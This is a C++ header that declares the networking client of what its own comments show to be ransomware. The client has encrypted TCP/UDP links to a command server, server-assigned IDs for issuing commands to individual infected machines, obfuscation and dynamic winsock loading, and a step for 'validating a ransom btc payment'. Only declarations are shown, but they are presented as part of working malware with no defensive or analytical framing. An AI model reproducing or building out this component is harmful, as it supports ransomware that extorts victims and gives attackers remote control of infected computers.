#ifndef _CLIENT_H_
#define _CLIENT_H_

#include "framework.h"
#include "net_types.h"
#include "obfuscate.h"
#include "net_common.h"

#include <memory>
#include <algorithm>

class Client {
public:

    Client(); // dynamically load winsock and put it in loaded dlls
    ~Client(); // unload winsock

	BOOL          Connect();
    BOOL          Disconnect();
    BOOL          MakeServerRequest( ClientRequest request, BOOL udp );
    BOOL          PingServer(SocketTypes serverType);
    BOOL          ReceiveDataOnSocket(SocketTypes s);
    
    /*
        Encrypt a ClientRequest struct with AES by serializing
        to a byte string, then encrypting that bytestring with AES
    */
    BYTESTRING    EncryptClientRequest(ClientRequest req) const;
    
    /*
        Decrypt a ServerRequest that was sent as a BYTESTRING
        from the TCP server.
    */
    ServerRequest DecryptServerRequest(BYTESTRING req); 

    /*
        Set the initial, permanant, encryption key for this client
    */
    inline void   SetEncryptionKey(std::string key) {
        if ( this->EncryptionKey.empty() ) this->EncryptionKey = key;
    }

protected:
    /*
        Identify whether the client class has loaded wsa
        and a defined type of socket in 'type'
    */
    BOOL          SocketReady(SocketTypes type) const;

    /*
        Decrypt a byte string received from a socket 
        and cast it to whatever type Data is.

        Note: please be careful using this and make sure
        the data sent is supposed to be casted to the type 'Data'
        or else your values will be garbage
    */
    template <typename Data>
    Data DecryptInternetData(BYTESTRING string) {
        NetCommon::DecryptByteString(string, this->EncryptionKey);
        return *reinterpret_cast<Data*>(string.data());
    }

    /*
        Send a message to the main tcp server
        i.e ask for public encryption key or validating a ransom btc payment
    */
    BOOL          TCPSendMessageToServer(ClientMessage message);

    /*
        Send a message to the udp server with information
        on the action the client wants the server to do,
        i.e connect to tcp server. Updates clients connected server
        to the tcp server info received in the udp response

        UDP Server used for quick communication and queries
    */
    BOOL          UDPSendMessageToServer(ClientMessage message);

    UDPResponse   UDPRecvMessageFromServer();

    // Further details on client
    Server        ConnectedServer = {0};          // Information on the clients connected server
    SOCKET        UDPSocket       = INVALID_SOCKET;
    SOCKET        TCPSocket       = INVALID_SOCKET;
    long          ClientUID       = -1;             // UID is assigned by the server. Used to perform commands on one client
    std::string   EncryptionKey;                    // Public encryption key for RSA, ENCRYPT AND DECRYPT KEY FOR AES
};

#endif